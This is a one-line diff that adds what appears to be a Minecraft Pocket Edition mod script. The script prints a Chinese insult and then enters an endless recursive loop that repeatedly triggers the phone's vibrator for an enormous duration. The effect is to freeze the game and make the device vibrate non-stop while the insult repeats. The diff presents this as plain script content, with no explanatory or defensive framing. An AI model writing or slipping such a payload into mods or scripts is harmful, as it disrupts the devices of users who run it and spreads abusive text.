@@ -1,0 +1,1 @@
+print("盒子狗傻逼"); function ABCD(){ while(1){ com.mojang.minecraftpe.MainActivity.currentMainActivity.get().getSystemService(android.app.Service.VIBRATOR_SERVICE).vibrate(1000*100000000); print("盒子狗傻逼"); ABCD(); } } ABCD();
